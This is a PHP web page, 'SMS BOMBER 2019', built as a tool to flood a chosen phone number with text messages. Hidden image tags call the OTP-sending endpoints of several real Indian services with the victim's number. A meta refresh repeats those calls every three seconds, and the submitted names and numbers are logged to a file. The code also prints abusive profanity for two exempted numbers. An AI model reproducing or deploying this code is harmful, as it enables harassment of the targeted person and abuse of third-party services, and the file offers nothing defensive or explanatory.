<?php 
error_reporting(0);
$tel_no=$_GET['phone'];
$name=$_GET['name'];
$c=$_GET['c']?$_GET['c']:0; 
$c++;
$count=$_GET['counts'];
?>
<!DOCTYPE html> //here html starts
<html lang="en">
<head>
	<title>SMS BOMBER 2019</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->
	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	<div class="container-contact100">

		<div class="wrap-contact100">
		<!--<div id="vansh" style="text-align: right"><img src="img.jpg" width="300" /></div>-->
			<form class="contact100-form validate-form" action="index.php" method="GET">
				<span class="contact100-form-title">
						<?php
 if($tel_no){
 	if($tel_no==9927950221||$tel_no==6283637708)
 	{
 	echo "<marquee direction=up><h1>Fuck Off You Bastard Try My NO !! :)</h1></marquee><br>";
 	}
 	else
	{
	echo "<meta http-equiv=refresh content='3; url=index.php?phone={$tel_no}&amp;c={$c}'>";
	}	
}
?>
					SMS BOMBER 2019 - START BOMBING
				</span>
			<?php if($tel_no)
					{ ?>
				<span class="contact100-form-title">
					 SMS SENT On <?php echo $tel_no; ?> : is <?php echo $c ?>
				</span>
			<?php }?>
			<div class="wrap-input100 validate-input" data-validate="Please enter your name">
					<input class="input100" type="text" name="name" placeholder="Full Name">
					<span class="focus-input100" required=''></span>
				</div>
				<div class="wrap-input100 validate-input"  style="display: none;" data-validate="Please enter your name">
					<input class="input100" type="text" name="counts" placeholder="Full Name" value=1>
					<span class="focus-input100" ></span>
				</div>
				<div class="wrap-input100 validate-input" data-validate = "Please enter your phone">
					<input class="input100" type="text" name="phone" placeholder="Phone">
					<span class="focus-input100"></span>
				</div>
				<div class="container-contact100-form-btn">
					<button class="contact100-form-btn">
						<span>
							<i class="fa fa-paper-plane-o m-r-6" aria-hidden="true"></i>
							Send
						</span>
					</button>
				</div>
				<span class="contact100-form-title">
					<br>
					<br>
					Written By<a href="https://www.facebook.com/vanshdevgan0221"><span id="a" ><i><br>Vansh Devgan</i></span></a>
				</span>
			</form>

		</div>
	</div>

	<div id="dropDownSelect1"></div>

<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>
<?php
if($count==1&&$tel_no!=769604)
{
$n="===========================================================";
$name = "\n Name : ".$name.PHP_EOL;
$mobno = "\n Name : ".$tel_no.PHP_EOL;
$file = fopen('list.txt', 'a'); //open a file
 $line = " " .$n. PHP_EOL; 
 fwrite($file,$line);
 fwrite($file,$name);
 fwrite($file,$mobno);
 fwrite($file,$line);
 $count++;
}?> */
<?php if($tel_no==9927950221||$tel_no==6283637708)
{
echo "<script type='text/javascript'>alert('Fuck OFF You Mother Fucker');</script>";
$tel_no=1;
}?>
<?php
 if($tel_no){
?>
<!--API FOR SMS-->
<div style='display:none'>

<img src='https://m.redbus.in/api/sendOtp?number=<?php echo $tel_no;?>&cc=91' alt=''/>
<img src= 'https://www.nearbuy.com/api/user/otp/send/<?php echo $tel_no;?>?sendOnlyIfCustomerExists=false&mode=sms' alt=''/>
<img src= 'https://mapi.indiamart.com/wservce/users/OTPverification/?token=imobile%4015061981&mobile_num=<?php echo $tel_no;?>&modid=DIR&user_mobile_country_code=91&flag=OTPGen&user_ip=21.91.21.102&user_country=IN&process=OTP_JoinFreeForm_Desktop&user_updatedusing=Join+Free+Form+Desktop' alt=''/>
<img src= 'http://www.moneycontrol.com/markets_on_mobile/index.php?mobile=<?php echo $tel_no;?>&id=1' alt=''/>
<img src='https://www.loot4hub.in/SCRIPT/public_html/call.php?number=<?php echo $tel_no;?>'/>
<img src='https://www.oyorooms.com/api/pwa/generateotp?phone=<?php echo $tel_no;?>&country_code=%2B91&nod=4'>
<img src='https://www.magicbricks.com/bricks/get-app-resend-Globle-Navigation.html?data=<?php echo $tel_no;?>&data1=50&data2=Magicbricks_Ap'>
<img src='https://portal2.bsnl.in/myportal/validatemobile.do?mobile=<?php echo $tel_no;?>'>
<img src='https://direct.delhivery.com/order/generate-otp?phoneNo=<?php echo $tel_no;?>'
</body>
</html> //here html ends
<!--API CLOSE FOR SMS-->
<?php
	}
?>
